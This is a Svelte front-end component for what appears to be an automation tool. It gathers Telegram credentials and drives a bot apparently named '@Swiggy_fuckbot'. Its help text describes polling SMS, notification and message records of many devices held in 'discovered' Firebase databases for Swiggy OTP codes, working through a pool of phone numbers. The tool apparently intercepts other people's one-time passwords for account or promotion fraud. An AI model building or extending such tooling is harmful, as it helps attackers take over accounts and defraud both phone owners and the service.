<script>
  import { autoEngine } from '$lib/automation-engine.svelte.js';
  import { engine as discoveryEngine } from '$lib/discovery-engine.svelte.js';

  let {
    savingConfig = false,
    onsaveconfig,
    tgPhone = $bindable(''),
    tgCode = $bindable(''),
    tgPassword = $bindable(''),
    tgSubmitting = false,
    onconnecttelegram,
    ondisconnecttelegram,
    onsubmitcode,
    onsubmittwofa
  } = $props();
</script>

<!-- Configuration Panel -->
<section class="card config-section">
  <div class="card-header">
    <div>
      <h2 class="card-title">Automation & Telegram Credentials</h2>
      <p class="card-desc">
        Provide your Telegram API credentials and target bot. Any user can enter their own credentials here;
        they are stored locally and synced directly to <code>worker_config.json</code> and Firebase.
      </p>
    </div>
    <button class="btn btn-primary" onclick={onsaveconfig} disabled={savingConfig}>
      {savingConfig ? '⏳ Saving...' : '💾 Save & Sync Config'}
    </button>
  </div>

  <div class="config-grid">
    <div class="form-group">
      <label class="form-label" for="tg-api-id">Telegram API ID</label>
      <input
        id="tg-api-id"
        type="text"
        class="form-input"
        bind:value={autoEngine.config.apiId}
        placeholder="e.g. 36120949"
      />
      <span class="form-help">Obtain from my.telegram.org (App api_id).</span>
    </div>

    <div class="form-group">
      <label class="form-label" for="tg-api-hash">Telegram API Hash</label>
      <input
        id="tg-api-hash"
        type="text"
        class="form-input"
        bind:value={autoEngine.config.apiHash}
        placeholder="e.g. 9f430c68e4cb8d3d25a19ed4edee9b9f"
      />
      <span class="form-help">Obtain from my.telegram.org (App api_hash).</span>
    </div>

    <div class="form-group">
      <label class="form-label" for="bot-username">Telegram Bot Username</label>
      <input
        id="bot-username"
        type="text"
        class="form-input"
        bind:value={autoEngine.config.botUsername}
        placeholder="e.g. @Swiggy_fuckbot"
      />
      <span class="form-help">The target bot username to automate (e.g. @Swiggy_fuckbot).</span>
    </div>

    <div class="form-group">
      <label class="form-label" for="tg-user-phone">Telegram Account Phone</label>
      <input
        id="tg-user-phone"
        type="text"
        class="form-input"
        bind:value={autoEngine.config.telegramPhone}
        placeholder="e.g. +919876543210"
      />
      <span class="form-help">Your Telegram account phone used for client authentication.</span>
    </div>

    <div class="form-group">
      <label class="form-label" for="response-kw">Response Matching Keyword</label>
      <input
        id="response-kw"
        type="text"
        class="form-input"
        bind:value={autoEngine.config.responseKeyword}
        placeholder="swiggy"
      />
      <span class="form-help">Keyword used to filter incoming SMS/notifications across devices (default: "swiggy").</span>
    </div>

    <div class="form-group">
      <label class="form-label" for="otp-timeout">OTP Response Timeout (seconds)</label>
      <input
        id="otp-timeout"
        type="number"
        class="form-input"
        min="10"
        max="180"
        bind:value={autoEngine.config.otpTimeoutSeconds}
      />
      <span class="form-help">Time to wait for OTP message before retrying once or cancelling (default: 60s).</span>
    </div>

    <div class="form-group">
      <label class="form-label" for="poll-interval">Run Loop Polling Interval (seconds)</label>
      <input
        id="poll-interval"
        type="number"
        class="form-input"
        min="2"
        max="60"
        bind:value={autoEngine.config.pollIntervalSeconds}
      />
      <span class="form-help">Delay between picking next eligible numbers in continuous run loop.</span>
    </div>

    <div class="form-group">
      <label class="form-label" for="target-db">Target Firebase Database</label>
      <select
        id="target-db"
        class="form-select"
        bind:value={autoEngine.config.selectedConnId}
      >
        <option value="all">All Configured Databases ({discoveryEngine.connections.length})</option>
        {#each discoveryEngine.connections as conn}
          <option value={conn.id}>{conn.name || conn.id} ({conn.url})</option>
        {/each}
      </select>
      <span class="form-help">Limit automation to a specific connection or use all enabled databases.</span>
    </div>

    <div class="form-group checkbox-group">
      <label class="checkbox-label">
        <input
          type="checkbox"
          bind:checked={autoEngine.config.autoStopWhenEmpty}
        />
        <span>Auto-stop when eligible number pool is exhausted</span>
      </label>
      <span class="form-help">Automatically stops the loop when all online and discovered numbers have been processed.</span>
    </div>

    <div class="form-group" style="grid-column: 1 / -1;">
      <div class="cross-device-info-banner">
        <span class="banner-icon">📡</span>
        <div>
          <strong>Cross-Device OTP Detection Active:</strong>
          The same phone number can be registered on multiple devices in Firebase. The worker simultaneously polls all devices and paths (messages, notifications, sms) sharing the target number for incoming Swiggy OTP codes.
        </div>
      </div>
    </div>
  </div>
</section>

<!-- Telegram Account Connection Card -->
<section class="card tg-auth-card">
  <div class="card-header">
    <div>
      <h2 class="card-title">Telegram Account Connection</h2>
      <p class="card-desc">
        Connect your Telegram account so the Python worker can initiate bot interactions.
        Credentials are relayed via Firebase — nothing sensitive is stored in the browser.
      </p>
    </div>
    <!-- Status pill -->
    <div class="tg-status-pill tg-status-{autoEngine.telegramAuth.status.toLowerCase()}">
      {#if autoEngine.telegramAuth.status === 'CONNECTED'}
        ✓ Connected
      {:else if autoEngine.telegramAuth.status === 'DISCONNECTED'}
        ○ Disconnected
      {:else if autoEngine.telegramAuth.status === 'ERROR'}
        ✕ Error
      {:else}
        ⏳ {autoEngine.telegramAuth.status.replace(/_/g, ' ')}
      {/if}
    </div>
  </div>

  <!-- CONNECTED STATE -->
  {#if autoEngine.telegramAuth.status === 'CONNECTED'}
    <div class="tg-connected-banner">
      <div class="tg-avatar">✓</div>
      <div class="tg-connected-info">
        <div class="tg-connected-name">
          {autoEngine.telegramAuth.username ? `@${autoEngine.telegramAuth.username}` : 'Telegram Account'}
        </div>
        {#if autoEngine.telegramAuth.phone}
          <div class="tg-connected-phone">{autoEngine.telegramAuth.phone}</div>
        {/if}
        {#if autoEngine.telegramAuth.connectedAt}
          <div class="tg-connected-ts text-xs text-muted">
            Connected at {autoEngine.telegramAuth.connectedAt}
          </div>
        {/if}
      </div>
      <button
        class="btn btn-danger-ghost btn-sm"
        onclick={ondisconnecttelegram}
        disabled={tgSubmitting}
        title="Clear session and disconnect"
      >
        Disconnect
      </button>
    </div>

  <!-- WAITING FOR CODE -->
  {:else if autoEngine.telegramAuth.status === 'WAITING_FOR_CODE' || autoEngine.telegramAuth.status === 'VERIFYING_CODE'}
    <div class="tg-auth-step">
      <div class="tg-step-header">
        <span class="step-badge">Step 2</span>
        <span class="step-title">Enter Verification Code</span>
      </div>
      <p class="form-help" style="margin-bottom:12px">
        Telegram sent a verification code to <strong>{autoEngine.telegramAuth.phone || tgPhone}</strong>
        (via SMS or Telegram app). Enter it below.
      </p>
      <div class="tg-input-row">
        <input
          id="tg-code"
          type="text"
          class="form-input tg-code-input"
          placeholder="e.g. 12345"
          maxlength="8"
          bind:value={tgCode}
          disabled={tgSubmitting || autoEngine.telegramAuth.status === 'VERIFYING_CODE'}
          onkeydown={(e) => e.key === 'Enter' && onsubmitcode && onsubmitcode()}
        />
        <button
          class="btn btn-primary"
          onclick={onsubmitcode}
          disabled={tgSubmitting || autoEngine.telegramAuth.status === 'VERIFYING_CODE' || !tgCode.trim()}
        >
          {autoEngine.telegramAuth.status === 'VERIFYING_CODE' ? '⏳ Verifying...' : 'Verify Code'}
        </button>
      </div>
    </div>

  <!-- WAITING FOR 2FA -->
  {:else if autoEngine.telegramAuth.status === 'WAITING_FOR_2FA' || autoEngine.telegramAuth.status === 'VERIFYING_2FA'}
    <div class="tg-auth-step">
      <div class="tg-step-header">
        <span class="step-badge">Step 3</span>
        <span class="step-title">Two-Factor Authentication</span>
      </div>
      <p class="form-help" style="margin-bottom:12px">
        Your account has 2FA enabled.
        {#if autoEngine.telegramAuth.hint2fa}
          Password hint: <em>{autoEngine.telegramAuth.hint2fa}</em>
        {/if}
      </p>
      <div class="tg-input-row">
        <input
          id="tg-password"
          type="password"
          class="form-input"
          placeholder="Your 2FA password"
          bind:value={tgPassword}
          disabled={tgSubmitting || autoEngine.telegramAuth.status === 'VERIFYING_2FA'}
          onkeydown={(e) => e.key === 'Enter' && onsubmittwofa && onsubmittwofa()}
        />
        <button
          class="btn btn-primary"
          onclick={onsubmittwofa}
          disabled={tgSubmitting || autoEngine.telegramAuth.status === 'VERIFYING_2FA' || !tgPassword.trim()}
        >
          {autoEngine.telegramAuth.status === 'VERIFYING_2FA' ? '⏳ Verifying...' : 'Submit Password'}
        </button>
      </div>
    </div>

  <!-- INITIAL / CONNECTING / ERROR STATE -->
  {:else}
    {#if autoEngine.telegramAuth.status === 'CONNECTING'}
      <div class="tg-auth-step">
        <div class="tg-step-header">
          <span class="step-badge">Step 1</span>
          <span class="step-title">Connecting…</span>
        </div>
        <p class="form-help">Auth request sent to Firebase. Waiting for the Python worker to initiate Telegram authentication…</p>
        <div class="tg-connecting-spinner">⏳</div>
      </div>
    {/if}

    {#if autoEngine.telegramAuth.error}
      <div class="tg-error-banner" style="display:flex; justify-content:space-between; align-items:flex-start; gap:8px;">
        <div>
          <strong>⚠ Auth Error:</strong> {autoEngine.telegramAuth.error}
        </div>
        <button
          type="button"
          style="background:none; border:none; color:inherit; font-size:16px; cursor:pointer; padding:0 4px; line-height:1; opacity:0.8;"
          onclick={() => { autoEngine.telegramAuth.error = null; }}
          title="Dismiss"
        >×</button>
      </div>
    {/if}

    {#if discoveryEngine.connections.length === 0}
      <div class="tg-error-banner" style="margin-bottom:12px; background:rgba(234,179,8,0.12); border-color:rgba(234,179,8,0.3); color:#fde047;">
        <strong>Notice:</strong> No Firebase databases are currently configured. Please add an active Firebase database on the Dashboard before connecting Telegram.
      </div>
    {/if}

    <!-- Phone input form -->
    <div class="tg-auth-step">
      {#if autoEngine.telegramAuth.status !== 'CONNECTING'}
        <div class="tg-step-header">
          <span class="step-badge">Step 1</span>
          <span class="step-title">Enter Telegram Phone Number</span>
        </div>
      {/if}
      <p class="form-help" style="margin-bottom:12px">
        Enter the phone number linked to your Telegram account (with country code).
        The Python worker will use it to request a login code from Telegram.
        <strong>Your API credentials remain in the server's .env file — nothing is stored here.</strong>
      </p>
      <div class="tg-input-row">
        <input
          id="tg-phone"
          type="tel"
          class="form-input"
          placeholder="+919876543210"
          bind:value={tgPhone}
          disabled={tgSubmitting || autoEngine.telegramAuth.status === 'CONNECTING'}
          onkeydown={(e) => e.key === 'Enter' && onconnecttelegram && onconnecttelegram()}
        />
        <button
          class="btn btn-primary"
          onclick={onconnecttelegram}
          disabled={tgSubmitting || autoEngine.telegramAuth.status === 'CONNECTING' || !tgPhone.trim()}
        >
          {autoEngine.telegramAuth.status === 'CONNECTING' ? '⏳ Connecting...' : 'Connect Telegram'}
        </button>
      </div>
    </div>
  {/if}

  <!-- Auth note -->
  <div class="tg-auth-note">
    <span class="note-icon">ℹ</span>
    <span>
      The Python worker must be running for authentication to proceed.
      Session is stored server-side in <code>my_telegram_session</code>.
      Once connected, the session persists across worker restarts — you only need to re-authenticate if the session expires.
    </span>
  </div>
</section>
